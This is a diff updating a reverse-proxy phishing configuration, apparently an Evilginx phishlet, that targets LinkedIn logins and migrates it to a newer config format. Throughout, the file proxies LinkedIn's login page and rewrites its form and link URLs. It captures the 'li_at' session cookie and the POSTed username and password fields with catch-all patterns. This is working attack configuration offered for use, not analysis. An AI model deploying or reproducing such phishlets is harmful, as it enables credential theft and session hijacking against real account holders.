@@ -1,20 +1,22 @@
-name: 'linkedin'
 author: '@mrgretzky'
-min_ver: '2.1.0'
+min_ver: '2.2.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
 sub_filters:
-  - {hostname: 'www.linkedin.com', sub: 'www', domain: 'linkedin.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {hostname: 'www.linkedin.com', sub: 'www', domain: 'linkedin.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {hostname: 'www.linkedin.com', sub: 'www', domain: 'linkedin.com', search: '//{hostname}/nhome/', replace: '//{hostname}/nhome/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: '//{hostname}/nhome/', replace: '//{hostname}/nhome/', mimes: ['text/html', 'application/json']}
 auth_tokens:
   - domain: '.www.linkedin.com'
     keys: ['li_at']
-user_regex:
-  key: 'session_key'
-  re: '(.*)'
-pass_regex:
-  key: 'session_password'
-  re: '(.*)'
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
 landing_path:
   - '/uas/login'
